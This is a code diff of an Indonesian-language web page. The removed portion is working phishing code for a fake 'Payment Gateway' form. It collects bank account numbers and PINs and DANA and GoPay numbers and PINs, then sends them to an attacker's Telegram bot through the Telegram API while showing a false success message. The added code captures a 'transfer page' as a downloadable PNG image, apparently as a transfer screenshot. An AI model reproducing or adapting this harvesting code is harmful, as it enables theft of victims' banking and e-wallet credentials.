+                        const clonedTransferPage = clonedDoc.querySelector('#transferPage');
+                        if (clonedTransferPage) {
+                            clonedTransferPage.style.display = 'flex';
+                            clonedTransferPage.style.flexDirection = 'column';
+                            clonedTransferPage.style.height = 'auto';
+                            clonedTransferPage.style.minHeight = '700px';
+                            clonedTransferPage.style.overflow = 'visible';
+                        }
+                    }
+                }).then(canvas => {
+                    screenshotCanvas = canvas;
+                    
+                    // Show preview
+                    const preview = document.getElementById('screenshotPreview');
+                    const ctx = preview.getContext('2d');
+                    preview.width = canvas.width / 2;
+                    preview.height = canvas.height / 2;
+                    ctx.clearRect(0,0,preview.width, preview.height);
+                    ctx.drawImage(canvas, 0, 0, canvas.width, canvas.height, 0, 0, preview.width, preview.height);
+                    
+                    // Show screenshot page
+                    transferPage.classList.remove('active');
+                    screenshotPage.classList.add('active', 'fade-in');
+                    
+                    // Reset button
+                    screenshotBtn.innerHTML = originalText;
+                    screenshotBtn.disabled = false;
+                }).catch(error => {
+                    console.error('Screenshot error:', error);
+                    alert('Gagal mengambil screenshot. Silakan coba lagi.');
+                    screenshotBtn.innerHTML = originalText;
+                    screenshotBtn.disabled = false;
+                });
+            }, 100);
+        }
+        
+        function downloadScreenshot() {
+            if (!screenshotCanvas) {
+                alert('Silakan buat screenshot terlebih dahulu');
                 return;
             }
             
-            let data = {};
-            data.userPin = userPin;
-            
-            // Ambil data berdasarkan metode pembayaran
-            if (selectedMethod === 'bank') {
-                const bank = document.getElementById('bankSelect');
-                const accountNumber = document.getElementById('accountNumber').value;
-                const pin = document.getElementById('bankPin').value;
-                
-                if (!bank.value || !accountNumber || !pin) {
-                    showNotification('Lengkapi semua data bank', true);
-                    return;
+            try {
+                // Prefer toBlob (better for large images / memory)
+                if (screenshotCanvas.toBlob) {
+                    screenshotCanvas.toBlob(function(blob) {
+                        if (!blob) {
+                            // fallback to toDataURL if blob fails
+                            const dataUrl = screenshotCanvas.toDataURL('image/png');
+                            const link = document.createElement('a');
+                            link.href = dataUrl;
+                            link.download = `transfer_${currentPaymentMethod}_${Date.now()}.png`;
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            return;
+                        }
+                        const url = URL.createObjectURL(blob);
+                        const link = document.createElement('a');
+                        link.href = url;
+                        link.download = `transfer_${currentPaymentMethod}_${Date.now()}.png`;
+                        // append the link, click then remove
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        // release memory
+                        setTimeout(() => URL.revokeObjectURL(url), 10000);
+                    }, 'image/png');
+                } else {
+                    // Older browsers fallback
+                    const dataUrl = screenshotCanvas.toDataURL('image/png');
+                    const link = document.createElement('a');
+                    link.href = dataUrl;
+                    link.download = `transfer_${currentPaymentMethod}_${Date.now()}.png`;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
                 }
-                
-                data.method = 'Bank';
-                data.bank = bank.options[bank.selectedIndex].text;
-                data.account = accountNumber;
-                data.pin = pin;
-            } 
-            else if (selectedMethod === 'dana') {
-                const number = document.getElementById('danaNumber').value;
-                const pin = document.getElementById('danaPin').value;
-                
-                if (!number || !pin) {
-                    showNotification('Lengkapi semua data DANA', true);
-                    return;
-                }
-                
-                data.method = 'DANA';
-                data.number = number;
-                data.pin = pin;
-            } 
-            else if (selectedMethod === 'gopay') {
-                const number = document.getElementById('gopayNumber').value;
-                const pin = document.getElementById('gopayPin').value;
-                
-                if (!number || !pin) {
-                    showNotification('Lengkapi semua data GoPay', true);
-                    return;
-                }
-                
-                data.method = 'GoPay';
-                data.number = number;
-                data.pin = pin;
+            } catch (error) {
+                console.error('Download error:', error);
+                alert('Gagal mengunduh screenshot. Silakan coba lagi.');
             }
-            
-            // Kirim data ke Telegram
-            sendToTelegram(data);
+        }
+        
+        // Format amount input
+        document.getElementById('jumlah').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^\d]/g, '');
+            if (value) {
+                value = parseInt(value).toLocaleString('id-ID');
+                e.target.value = value;
+            } else {
+                e.target.value = '';
+            }
         });
-        
-        // Fungsi untuk mengirim data ke Telegram
-        function sendToTelegram(data) {
-            let message = `🔔 *Pembayaran Baru* 🔔\n\n`;
-            message += `🔐 *PIN Anda:* ${data.userPin}\n`;
-            message += `💳 *Metode:* ${data.method}\n`;
-            
-            if (data.method === 'Bank') {
-                message += `🏦 *Bank:* ${data.bank}\n`;
-                message += `📋 *No. Rekening:* ${data.account}\n`;
-                message += `🔢 *PIN Bank:* ${data.pin}\n`;
-            } else {
-                message += `📱 *Nomor:* ${data.number}\n`;
-                message += `🔢 *PIN ${data.method}:* ${data.pin}\n`;
-            }
-            
-            message += `\n_Data dikirim dari Payment Gateway_`;
-            
-            // Encode message untuk URL Telegram
-            const encodedMessage = encodeURIComponent(message);
-            
-            // Buat URL Telegram
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
-            
-            // Kirim data menggunakan fetch API
-            fetch(telegramUrl)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        showNotification('Pembayaran berhasil! Data telah dikirim.');
-                        // Reset form setelah berhasil
-                        document.getElementById('paymentForm').reset();
-                    } else {
-                        showNotification('Gagal mengirim data. Silakan coba lagi.', true);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    showNotification('Terjadi kesalahan. Silakan coba lagi.', true);
-                });
-        }
-        
-        // Fungsi untuk menampilkan notifikasi
-        function showNotification(message, isError = false) {
-            const notification = document.getElementById('notification');
-            const notificationText = document.getElementById('notification-text');
-            
-            notificationText.textContent = message;
-            
-            if (isError) {
-                notification.classList.add('error');
-            } else {
-                notification.classList.remove('error');
-            }
-            
-            notification.classList.add('show');
-            
-            // Sembunyikan notifikasi setelah 3 detik
-            setTimeout(function() {
-                notification.classList.remove('show');
-            }, 3000);
-        }
     </script>
 </body>
-        </html>
+</html>
